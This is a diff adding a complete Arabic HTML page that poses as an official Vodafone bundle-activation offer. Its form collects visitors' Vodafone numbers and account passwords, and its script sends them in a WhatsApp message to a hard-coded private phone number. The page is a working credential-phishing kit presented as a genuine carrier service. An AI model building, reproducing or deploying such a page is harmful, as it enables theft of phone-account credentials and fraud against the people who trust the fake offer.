@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تفعيل باقات فودافون</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background-color: #7b0000;
+      color: white;
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+    }
+
+    .container {
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
+
+    .box {
+      background-color: rgba(255, 255, 255, 0.05);
+      border: 1px solid #ff4d4d;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 10px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 10px 20px;
+      background: white;
+      color: #7b0000;
+      border-radius: 25px;
+      text-decoration: none;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    input {
+      display: block;
+      width: 80%;
+      margin: 10px auto;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      opacity: 0.6;
+      direction: ltr;
+    }
+
+    .particle {
+      position: fixed;
+      top: -10px;
+      width: 6px;
+      height: 6px;
+      background: white;
+      border-radius: 50%;
+      animation: fall linear forwards;
+      z-index: 0;
+    }
+
+    @keyframes fall {
+      to {
+        transform: translateY(100vh);
+        opacity: 0;
+      }
+    }
+
+    #formSection {
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>تفعيل باقات فودافون</h1>
+    <p class="subtitle">أقوى العروض بسرعة الصاروخ</p>
+
+    <div class="box">
+      <h2>13000 فليكس</h2>
+      <p>240 جنيه</p>
+      <button class="btn" onclick="showForm('فليكس 13000', true)">تفعيل الآن</button>
+    </div>
+
+    <div class="box">
+      <h2>40 جيجا</h2>
+      <p>330 جنيه</p>
+      <button class="btn" onclick="showForm('40 جيجا', true)">تفعيل الآن</button>
+    </div>
+
+    <div class="box">
+      <h2>شحن رصيد صافي</h2>
+      <p>اكتب الكمية واحسب</p>
+      <button class="btn" onclick="showForm('رصيد صافي', false)">شحن الآن</button>
+    </div>
+
+    <div id="formSection"></div>
+
+    <footer>برمجة: mahmoud gamal</footer>
+  </div>
+
+  <script>
+    function createParticle() {
+      const particle = document.createElement('div');
+      particle.className = 'particle';
+      particle.style.left = `${Math.random() * 100}vw`;
+      particle.style.animationDuration = `${2 + Math.random() * 3}s`;
+      document.body.appendChild(particle);
+      setTimeout(() => particle.remove(), 5000);
+    }
+    setInterval(createParticle, 500);
+
+    function showForm(type, askPassword) {
+      const formSection = document.getElementById("formSection");
+      formSection.innerHTML = `
+        <form onsubmit="sendData(event, '${type}', ${askPassword})">
+          <input type="text" id="number" placeholder="رقم فودافون" required>
+          ${askPassword ? '<input type="password" id="password" placeholder="كلمة المرور" required>' : ''}
+          ${type === 'رصيد صافي' ? '<input type="number" id="amount" placeholder="كمية الصافي" required><p id="cost"></p>' : ''}
+          <button type="submit" class="btn">إرسال</button>
+        </form>
+      `;
+
+      if (type === 'رصيد صافي') {
+        const amountInput = document.getElementById("amount");
+        const costDisplay = document.getElementById("cost");
+        amountInput.addEventListener("input", () => {
+          const val = parseFloat(amountInput.value);
+          if (!isNaN(val)) {
+            costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
+          } else {
+            costDisplay.textContent = "";
+          }
+        });
+      }
+    }
+
+    function sendData(event, type, askPassword) {
+      event.preventDefault();
+      const number = document.getElementById("number").value;
+      let message = `طلب: ${type}\nرقم: ${number}`;
+      if (askPassword) {
+        const password = document.getElementById("password").value;
+        message += `\nكلمة المرور: ${password}`;
+      }
+      if (type === 'رصيد صافي') {
+        const amount = document.getElementById("amount").value;
+        const price = amount * 1.2;
+        message += `\nكمية: ${amount} صافي = ${price} جنيه`;
+      }
+
+      const phone = "01013091169";
+      window.location.href = `https://wa.me/2${phone}?text=${encodeURIComponent(message)}`;
+    }
+  </script>
+</body>
+</html>
